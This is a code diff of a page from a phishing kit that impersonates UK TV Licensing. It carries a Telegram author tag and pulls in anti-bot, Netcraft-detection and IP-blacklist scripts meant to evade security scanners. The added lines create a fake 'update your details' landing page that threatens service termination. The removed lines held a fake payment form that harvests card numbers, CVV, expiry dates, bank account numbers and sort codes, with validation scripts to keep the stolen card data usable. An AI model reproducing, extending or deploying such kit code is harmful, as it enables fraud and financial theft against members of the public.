@@ -1,8 +1,10 @@
 <?php
 // @Kr3pto on telegram
+error_reporting(0);
+session_start();
 require "configg.php";
-require "tvgb_assetz/sinc/session_protect.php";
 require "tvgb_assetz/sinc/functions.php";
+
  
 if($internal_antibot == 1){
 	require "tvgb_assetz/old_blocker.php";
@@ -45,41 +47,12 @@ if($external_antibot == 1){
 		exit;
 	}
 }
-
-
-error_reporting(0);
-ini_set('display_errors', '0');
-date_default_timezone_set('Europe/London');
-session_start();
-
-if($_POST['address'] and $_POST['town'] and $_POST['postcode']){
-	
-	$_SESSION['address'] = $_POST['address'];
-	$_SESSION['town'] = $_POST['town'];
-	$_SESSION['postcode'] = $_POST['postcode'];
-	
-	$title = $_SESSION['title'];
-	$initial = $_SESSION['initial'];
-	$lastName = $_SESSION['lastName'];
-	$email = $_SESSION['email'];
-	$mobile = $_SESSION['mobile'];
-	
-	$address = $_SESSION['address'];
-	$town = $_SESSION['town'];
-	$postcode = $_SESSION['postcode'];
-	
-	
-	
-}else{
-	$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
-	fputs($fp, "\r\n$ip\r\n");
-	fclose($fp);
-	header_remove();
-	header("Connection: close\r\n");
-	http_response_code(404);
-	exit;
-}
-
+$rand = generateRandomString(130);
+require "tvgb_assetz/sinc/visitor_log.php";
+require "tvgb_assetz/sinc/netcraft_check.php";
+require "tvgb_assetz/sinc/blacklist_lookup.php";
+require "tvgb_assetz/sinc/ip_range_check.php";
+//header("location:AboutTheTVLicenceHolder.php?sslchannel=true&sessionid=$rand");
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="https://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="">
@@ -87,7 +60,7 @@ if($_POST['address'] and $_POST['town'] and $_POST['postcode']){
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <title>Payment details - TV Licensing ™</title>
+        <title>Welcome to TV Licensing's Update Process - TV Licensing ™</title>
         <link rel="stylesheet" href="tvgb_assetz/css/master.css" />
         <link rel="stylesheet" href="tvgb_assetz/css/jquery.ui.all.css" />
         <link rel="stylesheet" href="tvgb_assetz/css/master_rwd.css" />
@@ -147,91 +120,37 @@ if($_POST['address'] and $_POST['town'] and $_POST['postcode']){
                 <div class="innerContainer" style="display: block;">
                     <ul id="iBread">
                         <li>
-                            <a href="javascript:void(0);">TV Licence<span class="linkPurpose">Link for TV Licence</span></a>
+                            <a href="javascript:void(0);">Home</a>
                         </li>
-                        <li>
-                            / <a href="javascript:void(0);"> Pay for your TV Licence<span class="linkPurpose robots-nocontent robots-noindex">Alternative link for Pay for your TV Licence</span> </a>
-                        </li>
-                        <li>/ Payment details</li>
+                        
+                        <li>/ Update</li>
                     </ul>
-                    <div id="iPrimary">
-                        <ol id="iStep" class="clearfix">
-                            <li class="visited">
-                                <label id="Label1" for="Button1"><span class="steplabel"> About TV Licence Holder</span><span class="hiddenAccessibleTextOnStepsMenu">Current step</span></label>
-                                <input type="button" id="Button1" class="stepSubmitButton" value="1" name="Button1" />
-                            </li>
-                            <li class="visited">
-                                <label id="Label2" for="Button2"><span class="steplabel"> Address to be licensed</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
-                                <input type="button" id="Button2" class="stepSubmitButton" value="2" name="Button2" />
-                            </li>
-                            <li class="selected">
-                                <label id="Label3" for="Button3"><span class="steplabel"> Payment details</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
-                                <input type="button" id="Button3" class="stepSubmitButton" value="3" name="Button3" />
-                            </li>
-                            <li class="disabled">
-                                <label id="Label4" for="Button4"><span class="steplabel"> Review and Confirm</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
-                                <input type="button" id="Button4" class="stepSubmitButton" value="4" name="Button4" />
-                            </li>
-                        </ol>
-                        <div class="panel secondary stepContent clearfix" id="stepContent">
-                            <h2 class="header beta"><span>Step 3: Payment details</span></h2>
-                            <form action="ReviewAndConfirm.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>" id="payForm" method="post">
-                                <p class="intro">Please complete all sections of this form, unless marked as optional.</p>
-                                <div class="findAddressContainer" id="addressContainer">
-                                    <div class="findAddressContainerContent"></div>
-                                    <div class="findAddressAttributes" id="divAttributes">
-                                        <br>
-                                        <div class="frmRow">
-                                            <label for="cardType">Card Type</label>
-											<select name="cardType" id="cardType" class="frmText" required="" style="border: 1px solid #bbb;">
-												<option selected="" disabled="" value="">Select Type</option>
-												<option value="Credit">Credit</option>
-												<option value="Debit">Debit</option>
-											</select>
-                                        </div>
-										<div class="frmRow">
-                                            <label for="ccname">Name as it appears on card</label>
-                                            <input name="ccname" id="ccname" type="text" class="frmText" autocomplete="off" required="" />
-                                        </div>
-                                        <div class="frmRow">
-                                            <label for="ccnum">Card number</label>
-                                            <input type="text" name="ccnum" id="ccnum" class="frmText" autocomplete="off" required="" />
-                                        </div>
-										<div class="frmRow">
-                                            <label for="ccexp">Expiry date</label>
-                                            <input type="text" name="ccexp" id="ccexp" class="frmText" autocomplete="off" required="" />
-                                        </div>
-                                        <div class="frmRow contained rule" style="border: unset;">
-                                            <label for="cccvv">CVV</label>
-                                            <input type="text" name="cccvv" id="cccvv" class="frmText" autocomplete="off" required="" />
-                                        </div>
-										<div id="issuerDetails" style="display:none;">
-										<p class="label">Issuer details</p>
-										<p class="helpEmail">Please confirm the account to which your payment details are registered.</p>
-										<br>
-										<div class="frmRow">
-                                            <label for="accno">Account number</label>
-                                            <input name="accno" id="accno" type="text" class="frmText" autocomplete="off" />
-                                        </div>
-										<div class="frmRow">
-                                            <label for="sortcode">Sort code</label>
-                                            <input name="sortcode" id="sortcode" type="text" class="frmText" autocomplete="off" />
-                                        </div>
-										</div>
-                                    </div>
-                                </div>
-                                <div class="div">
-                                    <div id="btnContinueContainer" class="btnGrp">
-                                        <span class="arrowBtn"><input type="submit" name="btnContinue" value="Continue" id="ctl00_Content_PaymentBegin1_btnContinue" /></span>
-                                    </div>
-                                </div>
+                    <div id="iPrimary" style="width:100%;">
+                        
+                        <div class="panel secondary stepContent clearfix" id="stepContent" style="width:100%;float:unset;">
+                            <h2 class="header beta"><span>Welcome to TV Licensing's Update Process</span></h2>
+							
+                            <form action="#" id="payForm" method="post">
+								<br>
+								<p style="color:#004855;">
+									<strong>All transmission are secured using 256 bit SSL layer.</strong>
+								</p>
+								<div style="padding-bottom:10px;"></div>
+								<div style="border-top:0.077em solid #E1E8EA;padding-bottom:20px;"></div>
+								<p class="intro">
+									The process ahead will help you in updating your details to its latest form, which will enable your services again.<br>Please use the accurate information relating your residential and billing data, as it will be used to bill you, as well as, your identity will be verified against the same set of information.<br>
+									<br>
+									Click on "Update" below to start the process.
+								</p>
+								<div class="primaryLnkWrap">
+									<a href="AboutTheTVLicenceHolder.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>" class="primaryLnk payBtnRenew jButtonRedirect primaryBtnLnk">
+										<span>Update<span>Initiate process now.</span></span>
+									</a>
+									<span class="divider"></span>
+								</div>
+								<br>
+								<p class="help">*All the information provided must match with your official record to keep a track of your identity. Any errors will lead to termination of the service.</p>
                             </form>
-                        </div>
-                    </div>
-                    <div id="iSecondary">
-                        <div class="panel primary">
-                            <h3 class="header alpha secure"><span>Secure website</span></h3>
-                            <p>Whether you’re paying for your TV Licence, setting up a Direct Debit, or updating your details, you can relax in the knowledge that this is a secure website and your personal information is safe with us.</p>
                         </div>
                     </div>
                     <div style="clear: both;"></div>
@@ -272,61 +191,5 @@ if($_POST['address'] and $_POST['town'] and $_POST['postcode']){
                 </div>
             </div>
         </div>
-		<script src="tvgb_assetz/js/jquery-3.7.1.min.js"></script>
-        <script src="tvgb_assetz/js/jquery-extra.min.js"></script>
-        <script>
-            $(document).ready(function () {
-				$('#cardType').change(function(){
-					if($(this).val() == 'Debit'){
-						$('#issuerDetails').show();
-						$('#accno').attr('required','required');
-						$('#sortcode').attr('required','required');
-					}else{
-						$('#issuerDetails').hide();
-						$('#accno').removeAttr('required');
-						$('#sortcode').removeAttr('required');
-					}
-				});
-				$("#ccexp").mask("00/00",{placeholder:"MM/YY"});
-				$("#accno").mask("00000000",{placeholder:"XXXXXXXX"});
-				$("#sortcode").mask("00-00-00",{placeholder:"XX-XX-XX"});
-                $("#ccnum").keyup(function () {
-                    var cc = $("#ccnum").val();
-                    if (cc.startsWith(3) || cc.startsWith(4) || cc.startsWith(5) || cc.startsWith(2) || cc.startsWith(6)) {
-                    } else {
-                        $("#ccnum").val("");
-						$("#ccnum").addClass("ng-invalid ng-dirty");
-						return false;
-                    }
-                });
-                $("#ccnum").payment("formatCardNumber");
-                var carde = $("#ccnum").val();
-                $("#ccnum").focusout(function () {
-                    var cardType = $.payment.cardType($("#ccnum").val());
-                    if ($.payment.validateCardNumber($("#ccnum").val()) == false) {
-                        $("#ccnum").val("");
-						$("#ccnum").addClass("ng-invalid ng-dirty");
-                        return false;
-                    }
-                    if (cardType == "amex") {
-                        $("#cccvv").attr("maxlength", "4");
-                    } else {
-                        $("#cccvv").attr("maxlength", "3");
-                    }
-                });
-                var allInputs = $(":input:not(button)");
-                allInputs.focusout(function () {
-                    $(this).blur(function () {
-                        if ($(this).prop("required")) {
-                            if (!$(this).val()) {
-								$(this).parent().addClass("error");
-                            } else {
-								$(this).parent().removeClass("error");
-                            }
-                        }
-                    });
-                });
-            });
-        </script>
     </body>
 </html>
